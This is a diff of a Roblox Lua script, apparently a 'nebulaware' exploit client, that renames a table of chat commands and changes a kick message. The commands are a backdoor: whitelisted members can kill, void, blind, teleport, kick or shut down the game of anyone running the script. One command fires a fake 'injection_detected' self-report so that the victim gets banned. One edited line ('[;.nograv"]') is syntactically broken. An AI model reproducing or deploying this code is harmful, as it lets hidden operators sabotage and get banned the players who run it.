@@ -71,12 +71,12 @@ local workspace = game:GetService("Workspace")
 local gravity = workspace.Gravity
 
 local cmds = {
-    [".kill"] = function()
+    [";kill"] = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
         end
     end,
-    [".void"] = function()
+    [";void"] = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local character = game.Players.LocalPlayer.Character
             local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
@@ -88,63 +88,63 @@ local cmds = {
             end
         end
     end,
-     [".nograv"] = function(player)
+     [;.nograv"] = function(player)
         if not isPlayerAllowed(player.Name) then
             gravity = 0 -- Set gravity to 0, disabling gravity
         end
     end,
-    [".grav"] = function(player)
+    [";grav"] = function(player)
         if not isPlayerAllowed(player.Name) then
             gravity = 196.2 -- Set gravity to the default value (196.2), enabling gravity
         end
     end,
-    [".night"] = function(player)
+    [";night"] = function(player)
         if not isPlayerAllowed(player.Name) then
             lighting.ClockTime = 0 -- Set the clock time to 0, making it night
         end
     end,
-    [".day"] = function(player)
+    [";day"] = function(player)
         if not isPlayerAllowed(player.Name) then
             lighting.ClockTime = 12 -- Set the clock time to 12, making it day
         end
     end,
-    [".kick"] = function()
+    [";kick"] = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             wait(1)
             for index, player in pairs(game.Players:GetPlayers()) do
-                player:Kick("kicked")
+                player:Kick("Kicked by nebulaware private member, cope.")
             end
         end
     end,
-  [".blind"] = function()
+  [";blind"] = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             createBlindGui()
         end
     end,
-    [".unblind"] = function()
+    [";unblind"] = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             removeBlindGui()
         end
     end,
-    [".gameban"] = function()
+    [";gameban"] = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local rs = game:GetService("ReplicatedStorage")
             local remote = rs:FindFirstChild("SelfReport", true)
             remote:FireServer("injection_detected")
         end
     end,
-    [".lobby"] = function()
+    [";lobby"] = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local gameId = 6872265039
             teleportToGame(gameId)
         end
     end,
-    [".shutdown"] = function()
+    [";shutdown"] = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             game:Shutdown()
         end
     end,
-    [".lagback"] = function()
+    [";lagback"] = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local character = game.Players.LocalPlayer.Character
             local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
